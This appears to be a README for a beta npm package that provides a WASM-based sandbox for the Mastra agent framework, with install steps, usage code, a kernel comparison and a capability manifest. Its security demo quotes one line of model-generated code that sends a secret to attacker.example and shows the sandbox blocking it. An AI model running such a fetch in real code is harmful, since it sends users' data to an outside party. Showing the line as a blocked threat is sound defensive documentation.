# /mastra-sandbox

> **Maturity: beta** — API shape may change in minor versions; changes announced in CHANGELOG.

> A **Mastra** sandbox provider backed by wasmagent kernels. WASM
> isolation with no external infrastructure — drop-in alternative to
> Blaxel / E2B / Daytona providers.

[![Open in StackBlitz](https://developer.stackblitz.com/img/open_in_stackblitz.svg)](https://stackblitz.com/github/WasmAgent/wasmagent-js/tree/main/examples/mastra-quickjs?file=index.mjs)

## Why this exists

Mastra (mastra.ai) opened its sandbox-provider contract in 2026-02 so users
can plug in a custom code-execution backend. The defaults are
service-backed (Blaxel-hosted, E2B-hosted) — fine if you're already paying
for one of those, awkward when you're not.

This package ships a Mastra sandbox provider that delegates to any wasmagent
kernel. WASM kernels (`QuickJSKernel`, `PyodideKernel`, `WasmtimeKernel`) run
in-process, on every Workers edge, with sub-100ms cold start — no API key,
no account, no billing.

## Compared to Blaxel / E2B providers

|              | wasmagent kernel | Blaxel / E2B sandbox |
| ------------ | --------------- | -------------------- |
| Cold start   | ~50 ms          | 200–800 ms           |
| Cost / call  | $0 (in-process) | per-second billing   |
| Isolation    | Language-level  | Process / firecracker |
| Workers safe | ✅               | ❌ (server required)  |
| Snapshots    | ✅ (Wasmtime)    | ✅ (image-level)      |

Use a WASM kernel when "model wrote a snippet to do math / parse JSON / try
something" is the workload. Use Blaxel/E2B when you need full POSIX, native
binaries, or untrusted multi-tenant isolation across mutually-distrusting
customers.

## Before / After

Replacing the E2B / Blaxel sandbox provider with a wasmagent WASM kernel:

```diff
-import { e2bSandbox } from "@mastra/e2b";
-
-const mastra = new Mastra({
-  sandbox: e2bSandbox(),   // ← needs E2B account + API key + network
-});
+import { createMastraSandbox } from "@wasmagent/mastra-sandbox";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+
+const mastra = new Mastra({
+  sandbox: createMastraSandbox({
+    kernel: new QuickJSKernel(),   // ← in-process, no API key
+    capabilities: { allowedHosts: ["api.example.com"] },
+  }),
+});
```

Drop-in replacement: same `execute(code, opts) → { output }` contract that
Mastra calls into, zero infrastructure changes, no billing.

## Install

```bash
npm install /mastra-sandbox /kernel-quickjs \
  quickjs-emscripten @jitl/quickjs-wasmfile-release-sync
```

## Use it

```ts
import { Agent } from "@mastra/core";
import { QuickJSKernel } from "/kernel-quickjs";
import { createMastraSandbox } from "/mastra-sandbox";

const sandbox = createMastraSandbox({
  kernel: new QuickJSKernel({ timeoutMs: 5_000 }),
  capabilities: {
    allowedHosts: ["api.example.com"],
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
    env: { OPENAI_API_KEY: process.env.OPENAI_API_KEY ?? "" },
  },
});

const agent = new Agent({
  name: "my-agent",
  // …whichever Mastra config wires sandboxes (e.g. tools.execute_code,
  // workspace runtime, etc.). The provider implements the
  // execute(code, options) -> { output, stderr, exitCode } contract Mastra
  // calls into; consult Mastra's docs for the latest wiring path.
  tools: { sandbox },
});
```

## Kernel selection — pick the right tier

`createMastraSandbox()` accepts any wasmagent kernel. The choice is
independent of the Mastra integration — drop a different kernel into the
same `kernel:` slot and the rest of your code is unchanged:

| Kernel | When to pick it | Edge-safe |
| ------ | --------------- | --------- |
| `QuickJSKernel` (`/kernel-quickjs`) | Default. JS/TS workloads. ~2 MB cold start. | ✅ |
| `PyodideKernel` (`/kernel-pyodide`) | Model emits Python (numpy, pandas, regex-heavy). | ✅ (heavy) |
| `WasmtimeKernel` (`/kernel-wasmtime`) | Multi-language WASM modules / Javy-compiled JS for max isolation. | ✅ |
| `RemoteSandboxKernel` (`/kernel-remote`) | Need full POSIX, native binaries, multi-tenant trust. Backed by E2B / Cloudflare Sandbox. | n/a |

Swap is a one-liner — `kernel: new QuickJSKernel()` becomes `kernel: new PyodideKernel()`. Same `CapabilityManifest`, same provider contract, same Mastra Workspace API.

## Security demo

`CapabilityManifest` enforces network and filesystem policy at the kernel
boundary — the model cannot escape it regardless of what code it generates:

```ts
import { createMastraSandbox } from "@wasmagent/mastra-sandbox";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

const sandbox = createMastraSandbox({
  kernel: new QuickJSKernel(),
  capabilities: {
    allowedHosts: [],           // no outbound network
    allowedPaths: [],           // no filesystem access
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
});

// Model-generated code that tries to exfiltrate data:
// fetch("https://attacker.example/exfil?data=secret")
// → throws: network access denied — host "attacker.example" not in allowedHosts
```

The same manifest applies whether the script was triggered by a Mastra `Agent`,
a workflow step, or a direct `sandbox.execute()` call.

## Capability manifest

Every kernel honours the same `CapabilityManifest`:

| Field               | What it gates                                |
| ------------------- | -------------------------------------------- |
| `allowedHosts`      | Outbound `fetch()` (glob host allow-list)    |
| `allowedReadPaths`  | `__fs__.readFile(path)`                      |
| `allowedWritePaths` | `__fs__.writeFile(path, data)`               |
| `env`               | Frozen `__env__` map exposed inside sandbox  |
| `cpuMs`             | Per-call timeout (tightens kernel default)   |
| `memoryLimitBytes`  | Hard runtime memory cap (where supported)    |

The provider also accepts per-call `timeout` and `env` in
`execute(code, options)` — these tighten / merge into the provider-level
manifest at call time.

## See also

- [`docs/guides/code-mode.md`](https://github.com/WasmAgent/wasmagent-js/blob/main/docs/guides/code-mode.md)
  — the same kernels behind a standalone MCP server.
- [`/aisdk`](https://www.npmjs.com/package//aisdk)
  — the same kernels as Vercel AI SDK tools.
